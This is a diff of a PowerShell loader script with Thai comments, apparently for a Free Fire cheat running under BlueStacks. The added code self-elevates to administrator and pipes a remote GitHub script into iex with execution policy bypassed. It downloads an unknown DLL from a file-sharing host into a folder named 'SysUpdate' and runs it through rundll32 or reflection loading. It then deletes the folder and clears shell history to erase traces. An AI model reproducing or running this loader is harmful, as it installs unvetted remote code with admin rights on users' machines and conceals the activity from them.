@@ -1,78 +1,93 @@
-# 1. ขอสิทธิ์ Administrator (Self-Elevating)
+# =========================================================
+# 1. ขอสิทธิ์ Administrator และดึง Code จาก GitHub
+# =========================================================
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
-    $myPath = $MyInvocation.MyCommand.Definition
-    if ($myPath) {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$myPath`"" -Verb RunAs
-    } else {
-        # กรณีรันแบบ Paste โค้ดลง Console 直接
-        $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (irm 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
-    }
+    $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
     exit
 }
 
-# 2. ตั้งค่าตัวแปรและ Environment
+# =========================================================
+# 2. ตั้งค่าสภาพแวดล้อม
+# =========================================================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $url = "https://files.catbox.moe/0ukxya.dll"
 $workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
-$downloadPath = Join-Path $workDir "source_file" 
+$downloadPath = Join-Path $workDir "temp_file"
 $blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
 
-# ล้างโฟลเดอร์ทำงานเก่า (ถ้ามี) และสร้างใหม่
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# 3. เริ่มการดาวน์โหลด
-Write-Host "[*] Downloading Component from Catbox..." -ForegroundColor Cyan
+# =========================================================
+# 3. ดาวน์โหลดไฟล์
+# =========================================================
+Write-Host "[*] Downloading Component..." -ForegroundColor Cyan
 try {
     Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
-    Write-Host "[+] Download Success." -ForegroundColor Green
 } catch {
-    Write-Host "[!] Download failed. Please check your internet connection." -ForegroundColor Red
-    Pause; exit
+    Write-Host "[!] Download failed." -ForegroundColor Red; Pause; exit
 }
 
-# 4. ตรวจสอบประเภทไฟล์ (Magic Number Check)
-# อ่าน Byte แรกๆ เพื่อดูว่าเป็น ZIP (PK) หรือไฟล์อื่น
-$fileBytes = Get-Content $downloadPath -Encoding Byte -TotalCount 2
-$fileMagic = -join ($fileBytes | ForEach-Object { "{0:X2}" -f $_ })
+# =========================================================
+# 4. แยกประเภทไฟล์ (ZIP หรือ DLL)
+# =========================================================
+$fileMagic = -join ((Get-Content $downloadPath -Encoding Byte -TotalCount 2) | ForEach-Object { "{0:X2}" -f $_ })
 
-if ($fileMagic -eq "504B") { 
-    # กรณีเป็นไฟล์ ZIP
-    Write-Host "[*] Detected ZIP package. Extracting..." -ForegroundColor Cyan
-    try {
-        Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
-        Remove-Item $downloadPath
-    } catch { 
-        Write-Host "[!] Extraction failed." -ForegroundColor Yellow 
-    }
+if ($fileMagic -eq "504B") {
+    Write-Host "[+] Extracting Package..." -ForegroundColor Green
+    Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
+    Remove-Item $downloadPath
 } else {
-    # กรณีเป็นไฟล์ DLL หรือไฟล์ตรงๆ
-    Write-Host "[*] Detected Direct File. Preparing system..." -ForegroundColor Cyan
+    Write-Host "[+] Detected Direct DLL. Renaming..." -ForegroundColor Green
     $finalDllPath = Join-Path $workDir "SystemData.dll"
     Move-Item $downloadPath $finalDllPath -Force
 }
 
-# 5. ค้นหาและรันระบบ
+# =========================================================
+# 5. การรันระบบ (แก้ปัญหา Missing Entry)
+# =========================================================
 $exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
 $dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1
 
 if ($exe) {
-    Write-Host "[+] Launching Executable: $($exe.Name)" -ForegroundColor Green
-    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName
+    Write-Host "[*] Launching EXE: $($exe.Name)" -ForegroundColor Cyan
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
 } elseif ($dll) {
-    Write-Host "[+] Launching via DLL Proxy (rundll32)..." -ForegroundColor Green
-    # สั่งรัน DLL โดยส่งค่า Path ของ BlueStacks เข้าไปเป็น Parameter
-    Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",Control_RunDLL `"$blueStacksPath`""
-} else {
-    Write-Host "[!] Error: No executable or DLL found in work directory." -ForegroundColor Red
+    Write-Host "[*] Attempting to load DLL..." -ForegroundColor Cyan
+    
+    # ทดลองรันด้วย Entry Point มาตรฐานหลายๆ ตัวเพื่อป้องกัน Error
+    $entries = @("DllRegisterServer", "DllInstall", "main", "Control_RunDLL")
+    $success = $false
+
+    foreach ($entry in $entries) {
+        Write-Host "[?] Trying Entry: $entry" -ForegroundColor Gray
+        $proc = Start-Process "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",$entry `"$blueStacksPath`"" -PassThru -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+        
+        if (!$proc.HasExited) {
+            Write-Host "[+] DLL is running with entry: $entry" -ForegroundColor Green
+            $success = $true
+            $proc | Wait-Process
+            break
+        }
+    }
+
+    if (!$success) {
+        Write-Host "[!] Rundll32 failed. Trying Reflection Load (Memory)..." -ForegroundColor Yellow
+        try {
+            [Reflection.Assembly]::LoadFile($dll.FullName) | Out-Null
+            Write-Host "[+] DLL Loaded into Memory Successfully." -ForegroundColor Green
+        } catch {
+            Write-Host "[!] This DLL is not a .NET assembly or entry point is invalid." -ForegroundColor Red
+        }
+    }
 }
 
-# 6. ทำความสะอาด (Cleanup)
-# หมายเหตุ: หากรันแบบ -Wait สคริปต์จะค้างไว้จนกว่าโปรแกรมจะปิดถึงจะลบไฟล์
-# หากต้องการให้ลบทันทีหลังรัน ให้เอา -Wait ออกจาก Start-Process (ตามที่แก้ให้ข้างบน)
-Write-Host "[*] Operation completed. Cleaning up..." -ForegroundColor Gray
-# Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
-
-Write-Host "[+] Done." -ForegroundColor Green
+# =========================================================
+# 6. ทำลายร่องรอย
+# =========================================================
+Write-Host "[*] Cleaning up activity traces..." -ForegroundColor Gray
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+Clear-History
+Write-Host "[+] Operation Complete." -ForegroundColor Green
